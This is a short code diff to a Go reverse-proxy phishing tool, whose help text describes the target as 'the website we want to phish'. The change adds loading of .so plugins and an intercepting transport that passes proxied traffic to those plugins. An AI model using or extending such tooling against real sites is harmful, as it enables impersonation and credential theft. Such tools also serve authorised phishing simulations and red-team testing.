@@ -18,11 +18,6 @@ import (
 	"golang.org/x/crypto/acme/autocert"
 )
 
-const (
-	// DefaultTimeout is the HTTP client timeout.
-	DefaultTimeout = 20 * time.Second
-)
-
 var (
 	targetURL           = flag.String("target", "", "The website we want to phish.")
 	address             = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
@@ -33,6 +28,7 @@ var (
 	sourceInsecure      = flag.Bool("insecure-target", false, "Not verify SSL certificate from target host.")
 	proxyCACertFilename = flag.String("proxy-ca-cert", "", "Proxy CA cert for signed requests")
 	sslHostname         = flag.String("ssl-hostname", "", "Hostname for SSL certificate")
+	pluginsDir          = flag.String("plugins-dir", "./plugins", "Directory for plugins")
 )
 
 func exitWithError(message string) {
@@ -111,11 +107,25 @@ func main() {
 		httpTransport.(*http.Transport).Proxy = http.ProxyURL(proxy)
 	}
 
+	pluginFilePaths, err := filepath.Glob(filepath.Join(*pluginsDir, "*.so"))
+	if err != nil {
+		exitWithError(err.Error())
+	}
+
+	plugins, err := judas.LoadPlugins(logger, pluginFilePaths)
+	if err != nil {
+		exitWithError(err.Error())
+	}
+
+	transport := &judas.InterceptingTransport{
+		RoundTripper: httpTransport,
+		Plugins:      plugins,
+	}
 	config := &judas.Config{
 		TargetURL:            u,
 		ResponseTransformers: responseTransformers,
 		Logger:               logger,
-		Transport:            httpTransport,
+		Transport:            transport,
 	}
 	phishingProxy := judas.New(config)
 
